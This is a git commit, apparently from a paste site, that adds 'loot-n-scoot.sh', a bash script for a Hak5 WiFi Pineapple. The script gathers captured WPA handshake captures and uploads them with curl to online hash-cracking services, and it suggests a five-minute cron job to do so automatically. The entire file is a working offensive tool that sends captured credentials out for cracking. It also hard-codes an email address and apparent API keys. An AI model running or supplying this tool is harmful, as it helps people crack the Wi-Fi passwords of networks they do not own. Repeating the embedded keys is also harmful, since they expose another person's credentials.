059d75e9dd7e42b298c074e058b5233b819e8687
ThePrimeSuspect <158302676+ThePrimeSuspect@users.noreply.github.com>
2024-02-10 01:49:32 -0800

    Create loot-n-scoot.sh

---
+++ loot-n-scoot.sh
@@ -0,0 +1,109 @@
+#!/bin/bash
+# sailboat-anon | fairwinds! | https://github.com/sailboat-anon/wifi-pineapple-mark-vii
+# hak5 wifi pineapple | loot-n-scoot.sh (formerly ohc-api.sh) | tested on mk 7 
+# auto-submit captured WPA handshakes (.pcap) to onlinehashcrack.com & wpa-sec.stanev.org, receive email upon completion | persistent handshake loot 
+
+# wpasec_key is generated here:  https://wpa-sec.stanev.org/?get_key
+# chmod +x loot-n-scoot.sh
+# ./loot-n-scoot.sh -e <your@emailaddress.com | ENV_VAR_EMAIL> -k <your_wpa_sec_key | ENV_VAR_WPASEC_KEY>
+# ./loot-n-scoot.sh -e sailboat@marina-network.local -k 906ea9affd7e10a19af871a8592c8ae0
+
+# workflow:
+# handshakes (if they exist) moved from /tmp to /root/loot/handshakes
+# handshakes sent to the onlinehashcrack.com api, user receives an email confirmation and upon completion
+# handshakes sent to wpa-sec.stanev.org, user receives an email upon completion (status: wpa-sec.stanev.org/?my_nets)
+
+# submitted handshakes in /root/loot/handshakes are renamed 'submitted-<formername>.pcap'
+# transaction logs: /root/loot/handshakes/handshakeslogs
+# persistent handshake loot: /root/loot/handshakes
+
+# uncomment and cusotomize the next 2 lines to bypass the -e and -k flags
+email=sheepstealing@gmail.com
+wpasec_key=d4e0262b5f99af35e9c3fb1a9d2bba11
+
+run it on cron (5 min):
+*/5 * * * * /root/loot-n-scoot.sh -e sailboat@marina-network.local -k 906ea9affd7e10a19af871a8592c8ae0
+
+cat <<EOL
+                .'|     .8
+               .  |    .8:
+              .   |   .8;:        .8
+             .    |  .8;;:    |  .8;
+            .     n .8;;;:    | .8;;;
+           .      M.8;;;;;:   |,8;;;;;
+          .    .,"n8;;;;;;:   |8;;;;;;
+         .   .',  n;;;;;;;:   M;;;;;;;;
+        .  ,' ,   n;;;SBA;;:  n;;;;;;;;;
+       . ,'  ,    N;;;;;;;;:  n;;;;;;;;;
+      . '   ,     N;;;;;;;;;: N;;;;;;;;;;
+     .,'   .      N;;;;;;;;;: N;;;;;;;;;;
+    ..    ,       N6666666666 N6666666666
+    I    ,        M           M
+   ---nnnnn_______M___________M______mmnnn
+         "-.                          /
+  __________"-_______________________/_________
+EOL
+echo "              GA2 - sailboat-anon@gh";
+echo " _             _                                        _         _     
+| | ___   ___ | |_      _ __        ___  ___ ___   ___ | |_   ___| |__  
+| |/ _ \ / _ \| __|____| '_ \ _____/ __|/ __/ _ \ / _ \| __| / __| '_ \ 
+| | (_) | (_) | ||_____| | | |_____\__ \ (_| (_) | (_) | |_ _\__ \ | | |
+|_|\___/ \___/ \__|    |_| |_|     |___/\___\___/ \___/ \__(_)___/_| |_|";
+
+while getopts e:k: flag;
+do
+    case $flag in
+        e) email=$OPTARG;;
+        k) wpasec_key=$OPTARG;;
+    esac
+done
+if [ -z "$email" ] || [ -z "$wpasec_key" ]
+then
+   echo "Syntax:";
+   echo "    ./loot-n-scoot.sh -e <your@emailaddress.com | ENV_VAR_EMAIL> -k <your_wpa_sec_key | ENV_VAR_WPASEC_KEY>";
+   echo "Examples:";
+   echo "    1) ./loot-n-scoot.sh -e sailboat@marina-network.local -k 906ea9affd7e10a19af871a8592c8aen ";
+   echo "    2) export email=sailboat@marina-network.local; export wpasec_key=906ea9affd7e10a19af871a8592c8aen; bash loot-n-scoot.sh";
+fi
+
+echo "> See /root/loot/handshakes/handshakeslogs for submission logs"
+echo "> ----------------------------"
+# setup our directories
+if [ ! -d "/root/loot/handshakes" ]; then
+  mkdir -p /root/loot/handshakes
+fi
+if [ ! -d "/root/loot/handshakes/handshakeslogs" ]; then
+  mkdir -p /root/loot/handshakes/handshakeslogs
+fi
+
+# get all current-state, unsubmitted handshakes
+echo "> Checking for unsubmitted handshakes"
+if [ -d "/tmp/handshakes" ]; then
+  ls /tmp/handshakes/*.pcap | grep -v "submitted*" > /tmp/ls-handshake.out
+fi
+
+if [ ! -s /tmp/ls-handshake.out ]
+ then
+	echo "> Unsubmitted handshakes NOT FOUND, exiting gracefully" 
+    exit
+fi
+
+# we have found current-state, unsubmitted handshakes; let's submit them
+echo "> Unsubmitted handshakes FOUND, uploading to api.onlinehashcrack.com"
+cp *.pcap -au /tmp/handshakes /root/loot/handshakes/handshakes
+now=$(date +%s)
+while IFS= read -r line; 
+  do 
+    curl -X POST -F "email=${email}" -F "file=@/root/loot/handshakes/handshakes/${line}" https://api.onlinehashcrack.com; 
+    echo "> Submitted ${line} to onlinehashcrack.com";
+    curl -X POST -F "webfile=@/root/loot/handshakes/handshakes/${line}" --cookie "key=${wpasec_key}" https://wpa-sec.stanev.org/\?submit;
+    echo "> Submitted ${line} to wpa-sec.stanev.org";
+done < /tmp/ls-handshake.out >> /root/loot/handshakes/handshakeslogs/submitted-${now}.txt;
+
+echo "Cleaning up..."
+while IFS= read -r line; do mv "/tmp/handshakes/${line}" "/tmp/handshakes/submitted-${line}"; mv "/root/loot/handshakes/handshakes/${line}" "/root/loot/handshakes/handshakes/submitted-{$line}"; done < /tmp/ls-handshake.out;
+rm /tmp/ls-handshake.out
+
+echo "Output:"
+cat /root/loot/handshakes/handshakes/handshakeslogs/submitted-${now}.txt
+This paste expires in <1 hour. Public IP access. Share whatever you see with others in seconds with Context.Terms of ServiceReport this
